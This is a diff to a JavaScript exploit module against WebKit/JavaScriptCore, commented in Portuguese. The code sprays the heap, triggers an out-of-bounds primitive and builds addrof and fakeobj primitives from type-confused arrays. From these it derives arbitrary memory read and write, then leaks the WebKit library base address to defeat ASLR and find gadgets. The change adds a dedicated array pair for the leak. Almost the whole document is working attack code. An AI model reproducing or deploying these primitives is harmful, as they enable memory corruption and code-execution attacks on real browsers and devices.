@@ -1,7 +1,8 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v107 - R60 Final com Vazamento REAL e LIMPO de ASLR WebKit - COLISÃO RESOLVIDA)
+// js/script3/testArrayBufferVictimCrash.mjs (v108 - R60 Final com Vazamento REAL e LIMPO de ASLR WebKit - SOLUÇÃO DE PAR DE ARRAYS)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
-// - **RESOLVIDA COLISÃO DE ENDEREÇOS na alocação do objeto de vazamento ASLR.**
+// - **RESOLVIDA COLISÃO DE ENDEREÇOS na alocação do objeto de vazamento ASLR
+//    através do uso de um par de arrays de type confusion dedicado.**
 // - Priorização do Vazamento de ASLR ANTES de corrupções arbitrárias no heap.
 // - Implementação funcional de vazamento da base da biblioteca WebKit.
 // - Removidas todas as simulações da fase de vazamento.
@@ -25,7 +26,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v107_R60_REAL_ASLR_LEAK_COLLISION_FIXED";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R60_REAL_ASLR_LEAK_DUAL_TC";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -56,10 +57,17 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
     const startTime = performance.now();
 
-    let addrof_primitive = null;
-    let fakeobj_primitive = null;
-    let arb_read_primitive = null;
-    let arb_write_primitive = null;
+    // Primitivas principais (addrof/fakeobj para L/E arbitrária)
+    let addrof_main = null;
+    let fakeobj_main = null;
+    let arb_read_main = null;
+    let arb_write_main = null;
+
+    // Primitivas DEDICADAS para o vazamento de ASLR
+    let addrof_leak = null;
+    let fakeobj_leak = null;
+    // Não precisamos de arb_read/arb_write dedicados para o leak,
+    // as primitivas principais serão usadas após o leak ASLR.
 
     try {
         logS3("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
@@ -75,8 +83,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
         logS3("Heap estabilizado inicialmente para reduzir realocações inesperadas pelo GC.", "good");
 
-        // --- FASE 2: Obtendo primitivas OOB e addrof/fakeobj ---
-        logS3("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
+        // --- FASE 2: Obtendo OOB e Primitivas addrof/fakeobj (Principais E de Vazamento) ---
+        logS3("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações (Principais e Dedicadas) ---", "subtest");
         const oobSetupStartTime = performance.now();
         logS3("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
         await triggerOOB_primitive({ force_reinit: true });
@@ -88,69 +96,110 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         }
         logS3(`Ambiente OOB configurado com DataView: ${getOOBDataView() !== null ? 'Pronto' : 'Falhou'}. Tempo: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
 
-        const confused_array = [13.37];
-        const victim_array = [{ a: 1 }];
+        // === Par de Arrays de Type Confusion PRINCIPAL ===
+        const confused_array_main = [13.37];
+        const victim_array_main = [{ a: 1 }];
 
-        logS3(`Array 'confused_array' inicializado: [${confused_array[0]}]`, "debug");
-        logS3(`Array 'victim_array' inicializado: [${JSON.stringify(victim_array[0])}]`, "debug");
+        logS3(`Array 'confused_array_main' inicializado: [${confused_array_main[0]}]`, "debug");
+        logS3(`Array 'victim_array_main' inicializado: [${JSON.stringify(victim_array_main[0])}]`, "debug");
 
-        addrof_primitive = (obj) => {
-            logS3(`[addrof] Tentando obter endereço de: ${obj}`, "debug");
-            victim_array[0] = obj;
-            const addr = doubleToInt64(confused_array[0]);
+        addrof_main = (obj) => {
+            logS3(`[addrof_main] Tentando obter endereço de: ${obj}`, "debug");
+            victim_array_main[0] = obj;
+            const addr = doubleToInt64(confused_array_main[0]);
             if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
-                const failMsg = `[addrof] FALHA: Endereço retornado para ${obj} (${addr.toString(true)}) parece inválido ou nulo/NaN.`;
+                const failMsg = `[addrof_main] FALHA: Endereço retornado para ${obj} (${addr.toString(true)}) parece inválido ou nulo/NaN.`;
                 logS3(failMsg, "error");
                 throw new Error(failMsg);
             }
-            logS3(`[addrof] SUCESSO: Endereço retornado para objeto ${obj}: ${addr.toString(true)}`, "debug");
+            logS3(`[addrof_main] SUCESSO: Endereço retornado para objeto ${obj}: ${addr.toString(true)}`, "debug");
             return addr;
         };
 
-        fakeobj_primitive = (addr) => {
-            logS3(`[fakeobj] Tentando forjar objeto no endereço: ${addr.toString(true)}`, "debug");
+        fakeobj_main = (addr) => {
+            logS3(`[fakeobj_main] Tentando forjar objeto no endereço: ${addr.toString(true)}`, "debug");
             if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
-                 const failMsg = `[fakeobj] ERRO: Endereço para fakeobj (${addr.toString(true)}) é inválido ou nulo/NaN.`;
+                 const failMsg = `[fakeobj_main] ERRO: Endereço para fakeobj (${addr.toString(true)}) é inválido ou nulo/NaN.`;
                  logS3(failMsg, "error");
                  throw new Error(failMsg);
             }
-            confused_array[0] = int64ToDouble(addr);
-            const obj = victim_array[0];
+            confused_array_main[0] = int64ToDouble(addr);
+            const obj = victim_array_main[0];
             if (obj === undefined || obj === null) {
-                logS3(`[fakeobj] ALERTA: Objeto forjado para ${addr.toString(true)} é nulo/undefined. Pode ser um objeto inválido.`, "warn");
+                logS3(`[fakeobj_main] ALERTA: Objeto forjado para ${addr.toString(true)} é nulo/undefined. Pode ser um objeto inválido.`, "warn");
             } else {
-                logS3(`[fakeobj] SUCESSO: Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj}`, "debug");
+                logS3(`[fakeobj_main] SUCESSO: Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj}`, "debug");
             }
             return obj;
         };
-        logS3("Primitivas 'addrof' e 'fakeobj' operacionais e robustas com validações aprimoradas.", "good");
+        logS3("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");
 
-        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
+        // === Par de Arrays de Type Confusion DEDICADO para VAZAMENTO ASLR ===
+        // Criado para evitar colisões com o par principal durante o vazamento real.
+        const confused_array_leak = [13.37];
+        const victim_array_leak = [{ a: 1 }];
+
+        logS3(`Array 'confused_array_leak' inicializado (DEDICADO para ASLR Leak): [${confused_array_leak[0]}]`, "debug");
+        logS3(`Array 'victim_array_leak' inicializado (DEDICADO para ASLR Leak): [${JSON.stringify(victim_array_leak[0])}]`, "debug");
+
+        addrof_leak = (obj) => {
+            logS3(`[addrof_leak] Tentando obter endereço de: ${obj}`, "debug");
+            victim_array_leak[0] = obj;
+            const addr = doubleToInt64(confused_array_leak[0]);
+            if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
+                const failMsg = `[addrof_leak] FALHA: Endereço retornado para ${obj} (${addr.toString(true)}) parece inválido ou nulo/NaN.`;
+                logS3(failMsg, "error");
+                throw new Error(failMsg);
+            }
+            logS3(`[addrof_leak] SUCESSO: Endereço retornado para objeto ${obj}: ${addr.toString(true)}`, "debug");
+            return addr;
+        };
+
+        fakeobj_leak = (addr) => {
+            logS3(`[fakeobj_leak] Tentando forjar objeto no endereço: ${addr.toString(true)}`, "debug");
+            if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
+                 const failMsg = `[fakeobj_leak] ERRO: Endereço para fakeobj (${addr.toString(true)}) é inválido ou nulo/NaN.`;
+                 logS3(failMsg, "error");
+                 throw new Error(failMsg);
+            }
+            confused_array_leak[0] = int64ToDouble(addr);
+            const obj = victim_array_leak[0];
+            if (obj === undefined || obj === null) {
+                logS3(`[fakeobj_leak] ALERTA: Objeto forjado para ${addr.toString(true)} é nulo/undefined. Pode ser um objeto inválido.`, "warn");
+            } else {
+                logS3(`[fakeobj_leak] SUCESSO: Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj}`, "debug");
+            }
+            return obj;
+        };
+        logS3("Primitivas DEDICADAS para ASLR Leak 'addrof' e 'fakeobj' operacionais e robustas.", "good");
+
+
+        // --- FASE 3: Construção da Primitiva de L/E Autocontida (Utiliza addrof_main/fakeobj_main) ---
         logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
         const leakerSetupStartTime = performance.now();
         const leaker = { obj_prop: null, val_prop: 0 };
         logS3(`Objeto 'leaker' inicializado: ${JSON.stringify(leaker)}`, "debug");
 
-        const leaker_addr = addrof_primitive(leaker);
+        const leaker_addr = addrof_main(leaker); // Usa a addrof PRINCIPAL
         logS3(`Endereço de 'leaker' obtido: ${leaker_addr.toString(true)}`, "info");
 
         const val_prop_addr = leaker_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
         logS3(`Endereço da propriedade 'val_prop' calculada: ${val_prop_addr.toString(true)} (offset 0x${JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET.toString(16)} do leaker_addr)`, "info");
 
-        arb_read_primitive = (addr) => {
+        arb_read_main = (addr) => {
             logS3(`[ARB_READ] Tentando ler de endereço ${addr.toString(true)}`, "debug");
             if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero)) {
                 const failMsg = `[ARB_READ] ERRO: Endereço inválido para leitura arbitrária: ${addr.toString(true)}.`;
                 logS3(failMsg, "error");
                 throw new Error(failMsg);
             }
-            leaker.obj_prop = fakeobj_primitive(addr);
+            leaker.obj_prop = fakeobj_main(addr); // Usa a fakeobj PRINCIPAL
             const value = doubleToInt64(leaker.val_prop);
             logS3(`[ARB_READ] SUCESSO: Valor lido de ${addr.toString(true)}: ${value.toString(true)}`, "debug");
             return value;
         };
 
-        arb_write_primitive = (addr, value) => {
+        arb_write_main = (addr, value) => {
             logS3(`[ARB_WRITE] Tentando escrever valor ${value.toString(true)} no endereço ${addr.toString(true)}`, "debug");
             if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero)) {
                 const failMsg = `[ARB_WRITE] ERRO: Endereço inválido para escrita arbitrária: ${addr.toString(true)}.`;
@@ -168,53 +217,47 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                     throw new Error(failMsg);
                 }
             }
-            leaker.obj_prop = fakeobj_primitive(addr);
+            leaker.obj_prop = fakeobj_main(addr); // Usa a fakeobj PRINCIPAL
             leaker.val_prop = int64ToDouble(valueToWrite);
             logS3(`[ARB_WRITE] SUCESSO: Escrita concluída no endereço ${addr.toString(true)}.`, "debug");
         };
-        logS3(`Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas. Tempo: ${(performance.now() - leakerSetupStartTime).toFixed(2)}ms`, "good");
+        logS3(`Primitivas de Leitura/Escrita Arbitrária autocontidas (principais) estão prontas. Tempo: ${(performance.now() - leakerSetupStartTime).toFixed(2)}ms`, "good");
 
         // --- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (Resistente ao ASLR) e Descoberta de Gadgets ---
-        // MOVIDA PARA ANTES DOS TESTES DE CORRUPÇÃO DO HEAP.
-        // Adicionando um "spray de arremesso" para afastar a alocação do Uint8Array da área do confused_array.
+        // Esta fase agora usa o par de arrays de type confusion DEDICADO.
         logS3("--- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional) ---", "subtest");
         const leakPrepStartTime = performance.now();
         let webkit_base_address = null;
 
-        logS3("Executando um pequeno 'spray de arremesso' para afastar o objeto de vazamento ASLR da área do confused_array...", "info");
-        const throwaway_spray = [];
-        // Criar um número suficiente de objetos para "empurrar" outras alocações.
-        // O número exato pode variar por ambiente e pode exigir ajuste.
-        for (let i = 0; i < 50; i++) { // 50 objetos de pequeno porte. Ajuste se necessário.
-            throwaway_spray.push({ tmp_a: i, tmp_b: "throwaway" + i });
-        }
-        logS3(`${throwaway_spray.length} objetos de arremesso criados.`, "debug");
-        // Não manter referências fortes ao throwaway_spray para permitir GC rápido após a fase.
+        // Não precisa mais de spray de arremesso aqui, nem de re-inicialização do OOB,
+        // pois estamos usando um par de arrays de type confusion DEDICADO para o leak,
+        // isolando-o do heap principal de corrupções.
 
-        logS3("Iniciando vazamento REAL da base ASLR da WebKit através de JSC::JSArrayBufferView::s_info (alocação limpa)...", "info");
+        logS3("Iniciando vazamento REAL da base ASLR da WebKit através de JSC::JSArrayBufferView::s_info (usando par dedicado)...", "info");
 
         // 1. Criar um Uint8Array para ter um objeto do tipo ArrayBufferView
-        // Este objeto agora é criado em um heap que, idealmente, não foi corrompido
-        // pelas operações de arb_write ainda, e o spray de arremesso pode ter ajudado
-        // a alocá-lo em um slot diferente do confused_array.
+        // Este objeto agora é alocado no contexto do par de arrays de vazamento,
+        // não colidindo com o par de arrays principal.
         const leak_candidate_u8a = new Uint8Array(1);
-        logS3(`Objeto Uint8Array criado para vazamento de ClassInfo (após spray de arremesso): ${leak_candidate_u8a}`, "debug");
+        logS3(`Objeto Uint8Array criado para vazamento de ClassInfo (usando par de TC dedicado): ${leak_candidate_u8a}`, "debug");
 
         // 2. Obter o endereço de memória do objeto leak_candidate (Uint8Array)
-        const leak_candidate_addr = addrof_primitive(leak_candidate_u8a);
+        // Usa a addrof DEDICADA para o leak
+        const leak_candidate_addr = addrof_leak(leak_candidate_u8a);
         logS3(`[REAL LEAK] Endereço do leak_candidate (Uint8Array): ${leak_candidate_addr.toString(true)}`, "leak");
 
         // 3. Ler o ponteiro para a Structure* do Uint8Array
-        // Offset: JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET (0x8)
-        const structure_ptr = arb_read_primitive(leak_candidate_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
+        // Usar arb_read_main, pois ela é universal (m_vector do OOB DV é manipulado).
+        // Não é fakeobj_leak, é arb_read_main!
+        const structure_ptr = arb_read_main(leak_candidate_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
         if (!isAdvancedInt64Object(structure_ptr) || structure_ptr.equals(AdvancedInt64.Zero)) {
             throw new Error(`[REAL LEAK] Falha ao ler ponteiro da Structure. Endereço inválido: ${structure_ptr.toString(true)}`);
         }
         logS3(`[REAL LEAK] Ponteiro para a Structure* do Uint8Array: ${structure_ptr.toString(true)}`, "leak");
 
         // 4. Ler o ponteiro para a ClassInfo* (esperado JSC::JSArrayBufferView::s_info) da Structure
-        // Offset: JSC_OFFSETS.Structure.CLASS_INFO_OFFSET (0x50, conforme config.mjs)
-        const class_info_ptr = arb_read_primitive(structure_ptr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
+        // Usa arb_read_main
+        const class_info_ptr = arb_read_main(structure_ptr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
         if (!isAdvancedInt64Object(class_info_ptr) || class_info_ptr.equals(AdvancedInt64.Zero)) {
             throw new Error(`[REAL LEAK] Falha ao ler ponteiro da ClassInfo. Endereço inválido: ${class_info_ptr.toString(true)}`);
         }
@@ -231,7 +274,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         if (webkit_base_address.equals(AdvancedInt64.Zero)) {
             throw new Error("[REAL LEAK] Endereço base da WebKit calculado resultou em zero. Vazamento pode ter falhado.");
         } else {
-            logS3("SUCESSO: Endereço base REAL da WebKit OBTIDO via vazamento de s_info (alocação limpa).", "good");
+            logS3("SUCESSO: Endereço base REAL da WebKit OBTIDO via vazamento de s_info (alocação limpa e dedicada).", "good");
         }
 
         // Descoberta de Gadgets (Funcional)
@@ -247,23 +290,21 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-Vazamento de ASLR) ---", "subtest");
         const rwTestPostLeakStartTime = performance.now();
         
-        // Repetindo o teste de L/E para garantir que as primitivas ainda funcionem
-        // após o vazamento de ASLR e as potenciais interações com o heap.
         const test_obj_post_leak = global_spray_objects[5001]; // Usando outro objeto do spray
         logS3(`Objeto de teste escolhido do spray (índice 5001) para teste pós-vazamento: ${JSON.stringify(test_obj_post_leak)}`, "info");
 
-        const test_obj_addr_post_leak = addrof_primitive(test_obj_post_leak);
+        const test_obj_addr_post_leak = addrof_main(test_obj_post_leak); // Usa addrof PRINCIPAL
         logS3(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");
 
         const value_to_write_post_leak = new AdvancedInt64(0xDEADC0DE, 0xFEEDBEEF);
         const prop_a_addr_post_leak = test_obj_addr_post_leak.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
         
-        logS3(`Executando arb_write_primitive (Pós-Vazamento): escrevendo ${value_to_write_post_leak.toString(true)} no endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
-        arb_write_primitive(prop_a_addr_post_leak, value_to_write_post_leak);
+        logS3(`Executando arb_write_main (Pós-Vazamento): escrevendo ${value_to_write_post_leak.toString(true)} no endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
+        arb_write_main(prop_a_addr_post_leak, value_to_write_post_leak); // Usa arb_write PRINCIPAL
         logS3(`Escrita do valor de teste (Pós-Vazamento) concluída.`, "info");
 
-        logS3(`Executando arb_read_primitive (Pós-Vazamento): lendo do endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
-        const value_read_post_leak = arb_read_primitive(prop_a_addr_post_leak);
+        logS3(`Executando arb_read_main (Pós-Vazamento): lendo do endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
+        const value_read_post_leak = arb_read_main(prop_a_addr_post_leak); // Usa arb_read PRINCIPAL
         logS3(`Leitura do valor de teste (Pós-Vazamento) concluída.`, "info");
         logS3(`>>>>> VALOR LIDO DE VOLTA (Pós-Vazamento): ${value_read_post_leak.toString(true)} <<<<<`, "leak");
 
@@ -277,8 +318,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         for (let i = 0; i < numResistanceTests; i++) {
             const test_value = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
             try {
-                arb_write_primitive(prop_a_addr_post_leak, test_value);
-                const read_back_value = arb_read_primitive(prop_a_addr_post_leak);
+                arb_write_main(prop_a_addr_post_leak, test_value); // Usa arb_write PRINCIPAL
+                const read_back_value = arb_read_main(prop_a_addr_post_leak); // Usa arb_read PRINCIPAL
 
                 if (read_back_value.equals(test_value)) {
                     resistanceSuccessCount_post_leak++;
